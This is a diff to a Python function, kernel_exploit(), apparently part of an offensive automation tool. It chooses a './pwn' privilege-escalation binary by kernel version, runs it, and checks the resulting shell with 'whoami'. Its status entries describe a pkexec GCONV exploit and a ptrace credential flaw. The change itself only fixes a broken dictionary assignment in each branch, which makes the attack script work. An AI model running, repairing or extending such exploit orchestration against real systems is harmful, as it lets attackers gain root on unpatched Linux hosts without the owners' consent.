@@ -28,7 +28,7 @@ def kernel_exploit():
         child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
         child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
         print(child_process_output)
-        dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'})
+        dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'}
         
         
     elif kernel_name1 == "5.5.0":
@@ -36,7 +36,7 @@ def kernel_exploit():
         child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
         child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
         print(child_process_output)
-        dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'})
+        dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value'}
         
         
     elif kernel_name1 == "4.19.0":
@@ -44,7 +44,7 @@ def kernel_exploit():
         child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
         child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
         print(child_process_output)
-        dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'})
+        dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
         
     
     elif kernel_name1 == "4.18.0":
@@ -52,21 +52,21 @@ def kernel_exploit():
         child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
         child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
         print(child_process_output)
-        dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'})
+        dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
         
     elif kernel_name1 == "4.15.11":
         args = ["./pwn"]
         child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
         child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
         print(child_process_output)
-        dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'})
+        dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
         
     elif kernel_name1 == "4.13.0":
         args = ["./pwn"]
         child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
         child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
         print(child_process_output)
-        dict = dict.update({'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'})
+        dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
     
     else:
         user = subprocess.Popen(['whoami'], stdout=subprocess.PIPE).communicate()[0]
